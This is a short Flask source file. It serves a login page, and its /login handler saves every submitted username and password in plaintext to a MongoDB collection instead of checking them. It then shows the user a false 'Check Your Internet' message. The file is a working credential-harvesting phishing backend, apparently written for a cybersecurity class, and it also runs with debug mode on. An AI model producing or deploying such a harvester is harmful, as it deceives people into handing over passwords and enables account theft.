from flask import Flask, render_template, request
from pymongo import MongoClient

app = Flask(__name__)

client = MongoClient("mongodb://localhost:27017/")
db = client["cyber_class"]
users = db["users"]

@app.route("/")
def login_page():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    users.insert_one({
        "username": username,
        "password": password
    })

    return "Check Your Internet"

if __name__ == "__main__":
    app.run(debug=True)
